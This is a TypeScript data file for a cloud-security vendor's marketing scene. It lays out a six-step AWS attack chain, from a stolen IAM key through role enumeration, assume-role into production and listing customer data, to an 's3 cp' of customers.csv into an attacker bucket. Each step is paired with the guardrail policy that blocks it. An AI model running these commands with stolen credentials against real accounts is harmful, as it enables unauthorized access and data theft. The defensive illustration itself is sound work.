// src/data/attack-sequence.ts
//
// The command ladder behind the home-page "A Tuesday in 2026" scene
// (src/components/sections/TuesdayAttackScene.astro).
//
// The commands are the real sequence from our own recorded demo
// (public/learn/demo-llm-privesc.cast), re-pointed at the scene's fictional
// account IDs. Never render the recording's real account numbers.
//
// Every control named here MUST already exist in representative-controls.ts —
// that file is the only place named controls may appear in a shipped payload.
// src/data/attack-sequence.test.ts enforces both invariants.
//
// Marketing surface, not a product manifest: these controls describe what the
// guardrails platform enforces or intends to enforce. Nothing here is generated
// from, or writes back to, the control knowledge base.

import { REPRESENTATIVE_CONTROLS } from '@/data/guardrails/representative-controls';

/** The two accounts in the scene. Fictional — must match the SVG's labels. */
export const DEV_ACCOUNT = '111122223333';
export const PROD_ACCOUNT = '444455556666';

/** The stolen credential: a long-term IAM *user* access key. This matters —
 *  IS-PERIMETER-PV-16 is scoped to `arn:aws:iam::*:user/*`, so the narrative
 *  must never show a role as the acting principal before the lateral move. */
export const ATTACKER_PRINCIPAL = `arn:aws:iam::${DEV_ACCOUNT}:user/ci-deploy`;
export const ASSUMED_PRINCIPAL = `arn:aws:sts::${PROD_ACCOUNT}:assumed-role/prod-admin/lateral-move`;

export type PolicyKind = 'SCP' | 'RCP' | 'VPC endpoint policy';

export interface DefenseWall {
  /** Control ID — must exist in REPRESENTATIVE_CONTROLS. */
  control: string;
  /** Display name, mirrored from the representative catalog. */
  name: string;
  sev: 'critical' | 'high' | 'medium' | 'low';
  kind: PolicyKind;
  /** The condition key doing the work — the detail an AWS reader looks for. */
  lever: string;
  /** Verbatim-shaped AWS AccessDenied output. */
  denyOut: string;
  /** Why this control is the wall at this step, not merely a control that applies. */
  why: string;
}

export interface AttackStep {
  n: number;
  id: string;
  /** Short label for the step rail. */
  label: string;
  /** Kill-chain phase, for the rail's second line. */
  phase: string;
  cmd: string;
  /** API invocations this step makes — step 4 assumes *and* re-checks identity. */
  calls: number;
  /** What the command returns when nothing stops it. */
  attackOut: string;
  /** The control that stops the chain here, or null when none can or should. */
  wall: DefenseWall | null;
  /** Required when wall is null — why there is deliberately no guardrail here. */
  noWallReason?: string;
}

export const ATTACK_STEPS: AttackStep[] = [
  {
    n: 1,
    id: 'foothold',
    label: 'Foothold',
    phase: 'Confirm the stolen key',
    cmd: 'aws sts get-caller-identity',
    calls: 1,
    attackOut: [
      '{',
      '    "UserId": "AIDA2XMPLE4ZK7QVBGH3T",',
      `    "Account": "${DEV_ACCOUNT}",`,
      `    "Arn": "${ATTACKER_PRINCIPAL}"`,
      '}',
    ].join('\n'),
    wall: null,
    noWallReason:
      'No guardrail can stop this one — and that is by design, not a gap. AWS documents ' +
      'sts:GetCallerIdentity as requiring no permissions: an explicit deny still returns the ' +
      'caller identity, because the same information comes back either way. Prevention has to ' +
      'land on what the credential can *do*, never on what the attacker is allowed to learn.',
  },
  {
    n: 2,
    id: 'enumerate',
    label: 'Enumerate',
    phase: 'Map the roles',
    cmd: "aws iam list-roles --query 'Roles[].RoleName' --output text",
    calls: 1,
    attackOut: [
      'ci-deploy-runner',
      'lambda-basic-exec',
      'eks-node-group',
      'prod-payments-crossaccount',
      '… 47 roles returned',
    ].join('\n'),
    wall: {
      control: 'IS-PERIMETER-PV-16',
      name: 'Restrict IAM user credentials to trusted networks',
      sev: 'high',
      kind: 'SCP',
      lever: 'aws:SourceIp / aws:SourceVpc, scoped to arn:aws:iam::*:user/*',
      denyOut: [
        'An error occurred (AccessDenied) when calling the ListRoles operation:',
        `User: ${ATTACKER_PRINCIPAL} is not authorized to perform:`,
        `iam:ListRoles on resource: arn:aws:iam::${DEV_ACCOUNT}:role/`,
        'with an explicit deny in a service control policy',
      ].join('\n'),
      why:
        'This is the first call in the chain that requires authorization at all, and the control ' +
        'gates on the principal\'s network origin rather than on the action. It is not "we blocked ' +
        'ListRoles" — nobody does that, it breaks every legitimate tool in the org. It is that a ' +
        'long-term access key used from outside the corporate CIDR or an expected VPC is inert for ' +
        'every call that follows. One control, positioned at the first authorized call, would end ' +
        'the entire chain here.',
    },
  },
  {
    n: 3,
    id: 'find-path',
    label: 'Find path',
    phase: 'Read the trust policy',
    cmd:
      'aws iam get-role-policy --role-name prod-payments-crossaccount \\\n' +
      "    --policy-name CrossAccountAccess --query 'PolicyDocument.Statement'",
    calls: 1,
    attackOut: [
      '[',
      '    {',
      '        "Effect": "Allow",',
      '        "Action": "sts:AssumeRole",',
      `        "Resource": "arn:aws:iam::${PROD_ACCOUNT}:role/prod-admin"`,
      '    }',
      ']',
    ].join('\n'),
    wall: null,
    noWallReason:
      'Deliberately no guardrail here. Reading IAM policy documents is ordinary operations — ' +
      'every deployment tool, access reviewer and least-privilege analyser does it. A control ' +
      'that blocked it would break the org to slow an attacker down by seconds. Reconnaissance ' +
      'is not where prevention belongs; the next step is.',
  },
  {
    n: 4,
    id: 'lateral',
    label: 'Lateral move',
    phase: 'Cross into production',
    cmd:
      `aws sts assume-role --role-arn arn:aws:iam::${PROD_ACCOUNT}:role/prod-admin \\\n` +
      '    --role-session-name lateral-move',
    calls: 2,
    attackOut: [
      '{',
      '    "AssumedRoleUser": {',
      `        "Arn": "${ASSUMED_PRINCIPAL}"`,
      '    },',
      '    "Credentials": { "AccessKeyId": "ASIA…", "Expiration": "…" }',
      '}',
      '',
      '$ aws sts get-caller-identity',
      `    "Account": "${PROD_ACCOUNT}"   ← now in production`,
    ].join('\n'),
    wall: {
      control: 'IS-IAM-PV-10',
      name: 'Protect designated privileged IAM roles from modification or assumption',
      sev: 'critical',
      kind: 'SCP',
      lever: 'Deny sts:AssumeRole on name-matched privileged roles, except one designated principal',
      denyOut: [
        'An error occurred (AccessDenied) when calling the AssumeRole operation:',
        `User: ${ATTACKER_PRINCIPAL} is not authorized to perform:`,
        `sts:AssumeRole on resource: arn:aws:iam::${PROD_ACCOUNT}:role/prod-admin`,
        'with an explicit deny in a service control policy',
      ].join('\n'),
      why:
        'The privilege hinge — the one step the whole attack depends on. Everything before it is ' +
        'reconnaissance in a sandbox; everything after it is production. What makes this the right ' +
        'wall is that an SCP sits *above* the role\'s trust policy: the deny holds no matter what ' +
        'the trust policy says. A misconfigured trust policy is the usual way this attack succeeds, ' +
        'and here that misconfiguration stops being reachable.',
    },
  },
  {
    n: 5,
    id: 'locate',
    label: 'Locate data',
    phase: 'Find the customer records',
    cmd: 'aws s3 ls s3://prod-payments-customer-data/',
    calls: 1,
    attackOut: [
      '2026-08-14 03:11:52   1.1 GiB  transactions-2026-q2.parquet',
      '2026-08-19 22:04:07   4.2 GiB  customers.csv',
      '2026-08-20 06:30:11   380 MiB  cardholder-tokens.json',
    ].join('\n'),
    wall: {
      control: 'IS-PERIMETER-PV-4',
      name: 'Network perimeter (VpceOrgID) — deny resource access from unexpected networks',
      sev: 'high',
      kind: 'RCP',
      lever: 'aws:VpceOrgID / corporate CIDR, enforced on the resource side',
      denyOut: [
        'An error occurred (AccessDenied) when calling the ListObjectsV2 operation:',
        `User: ${ASSUMED_PRINCIPAL} is not authorized to perform:`,
        's3:ListBucket on resource: arn:aws:s3:::prod-payments-customer-data',
        'with an explicit deny in a resource control policy',
      ].join('\n'),
      why:
        'By this point the attacker holds a completely legitimate, fully privileged production ' +
        'session. Nothing about the credential is wrong any more, so identity-based checks have ' +
        'nothing left to catch. The only discriminator remaining is where the request came from — ' +
        'and this one is enforced on the *resource* side, so it holds even if an identity policy ' +
        'or bucket policy would have allowed the call. Maximum privilege, still unusable.',
    },
  },
  {
    n: 6,
    id: 'exfiltrate',
    label: 'Exfiltrate',
    phase: 'Copy it out of the org',
    cmd:
      'aws s3 cp s3://prod-payments-customer-data/customers.csv \\\n' +
      '    s3://exfil-9c2a/',
    calls: 1,
    attackOut: [
      'copy: s3://prod-payments-customer-data/customers.csv',
      '   to: s3://exfil-9c2a/customers.csv',
      '4.2 GiB / 4.2 GiB   100%',
    ].join('\n'),
    wall: {
      control: 'IS-PERIMETER-PV-9',
      name: 'Resource perimeter — restrict org principals to trusted resources',
      sev: 'high',
      kind: 'SCP',
      lever: 'aws:ResourceOrgID must equal your organization',
      denyOut: [
        'An error occurred (AccessDenied) when calling the PutObject operation:',
        `User: ${ASSUMED_PRINCIPAL} is not authorized to perform:`,
        's3:PutObject on resource: arn:aws:s3:::exfil-9c2a/customers.csv',
        'with an explicit deny in a service control policy',
      ].join('\n'),
      why:
        'The last line, with every layer above it assumed away: valid production credentials, an ' +
        'accepted network, a successful read. One invariant is left — where the data is allowed to ' +
        'go. Org principals may only act on resources inside the org, so the copy into the ' +
        'attacker\'s own account fails even though everything preceding it worked.',
    },
  },
];

/** Ordered layers the visitor can switch off, outermost first. */
export const DEFENSE_LAYERS = ATTACK_STEPS
  .filter((s): s is AttackStep & { wall: DefenseWall } => s.wall !== null)
  .map(s => ({ step: s.n, control: s.wall.control, name: s.wall.name, sev: s.wall.sev }));

/**
 * The first step whose wall is still enforced, given a set of controls the
 * visitor has assumed away. Returns null when every layer is switched off —
 * which is precisely the "Without InstaSecure" tab.
 */
export function firstSurvivingWall(disabled: Iterable<string> = []): AttackStep | null {
  const off = new Set(disabled);
  return ATTACK_STEPS.find(s => s.wall !== null && !off.has(s.wall.control)) ?? null;
}

/** True once the chain runs to completion — no wall left standing. */
export function isBreached(disabled: Iterable<string> = []): boolean {
  return firstSurvivingWall(disabled) === null;
}

/** Every API invocation the full chain makes — the attack tab's headline stat. */
export const TOTAL_CALLS = ATTACK_STEPS.reduce((sum, s) => sum + s.calls, 0);

/** How many invocations actually succeed before the chain hits a standing wall. */
export function callsSucceeded(disabled: Iterable<string> = []): number {
  const wall = firstSurvivingWall(disabled);
  const lastRun = wall ? wall.n - 1 : ATTACK_STEPS.length;
  return ATTACK_STEPS.filter(s => s.n <= lastRun).reduce((sum, s) => sum + s.calls, 0);
}

/** Layers still switched on. */
export function layersEnforced(disabled: Iterable<string> = []): number {
  const off = new Set(disabled);
  return DEFENSE_LAYERS.filter(l => !off.has(l.control)).length;
}

/** Data leaves the org only if the final step runs. */
export function dataExposed(disabled: Iterable<string> = []): string {
  return isBreached(disabled) ? '4.2 GB' : '0';
}

/**
 * The four asset tiles in the scene diagram, and the step each one represents.
 * The diagram sits directly above the ladder, so it has to track the standing
 * wall — otherwise peeling a layer leaves the picture insisting nothing moved.
 */
export interface SceneAsset {
  key: 'iam' | 'role' | 'admin' | 's3';
  /** The step whose success this tile depicts. */
  step: number;
  /** Copy while the chain never got here. */
  held: { name: string; tag: string };
  /** Copy once the chain ran through it. */
  lost: { name: string; tag: string };
}

export const SCENE_ASSETS: SceneAsset[] = [
  {
    key: 'iam',
    step: 2,
    held: { name: 'IAM enumeration attempt', tag: 'denied · SCP' },
    lost: { name: 'IAM roles & trust policies', tag: 'enumerated' },
  },
  {
    key: 'role',
    step: 3,
    held: { name: 'Credential rendered inert', tag: 'data perimeter' },
    lost: { name: 'Cross-account role found', tag: 'discovered' },
  },
  {
    key: 'admin',
    step: 4,
    held: { name: 'Production admin · sealed', tag: 'no path' },
    lost: { name: 'Production admin session', tag: 'assumed' },
  },
  {
    key: 's3',
    step: 6,
    // Policy-type-agnostic on purpose: which wall is standing here changes as
    // layers are peeled (PV-4 is an RCP, PV-9 an SCP), so the tile can't name one.
    held: { name: 'Customer data · safe', tag: 'no path out' },
    lost: { name: 'Customer data · S3', tag: '4.2 GB out' },
  },
];

/**
 * Which diagram tile each step is *about*. Drives the focus treatment — the tile
 * in play stays at full strength, everything already passed recedes, so several
 * lit tiles never read as equally important.
 *
 * Step 01 focuses nothing (it is the attacker bubble, not a tile) and steps 05
 * and 06 share the S3 tile — locating and copying concern the same asset.
 *
 * TuesdayAttackScene's inline script keeps a verbatim copy of this map, because
 * an `is:inline` script cannot import. `attack-sequence.test.ts` asserts the two
 * stay identical.
 */
export interface StepFocus {
  /** Asset tiles the step is about. Empty for step 01 — that one is the attacker. */
  tiles: string[];
  /** Which account the action is happening in. The other one recedes. */
  account: 'dev' | 'prod';
}

export const STEP_FOCUS: Record<number, StepFocus> = {
  1: { tiles: [],        account: 'dev' },
  2: { tiles: ['iam'],   account: 'dev' },
  3: { tiles: ['role'],  account: 'dev' },
  4: { tiles: ['admin'], account: 'prod' },
  5: { tiles: ['s3'],    account: 'prod' },
  6: { tiles: ['s3'],    account: 'prod' },
};

/**
 * The step at which the action crosses into prod — the lateral move. Also the
 * step the connecting arrow and its pill belong to, so they recede after it.
 */
export const LATERAL_STEP = Number(
  Object.keys(STEP_FOCUS).find(k => STEP_FOCUS[Number(k)].account === 'prod'),
);

/** True when the chain ran past `step` — i.e. that step's command succeeded. */
export function stepSucceeded(step: number, disabled: Iterable<string> = []): boolean {
  const wall = firstSurvivingWall(disabled);
  return wall === null || step < wall.n;
}

/** Named controls used by the ladder, for the invariant test and for rendering. */
export const LADDER_CONTROL_IDS = DEFENSE_LAYERS.map(l => l.control);

/** Look up a ladder control in the public representative catalog. */
export function repControl(id: string) {
  return REPRESENTATIVE_CONTROLS.find(c => c.id === id);
}
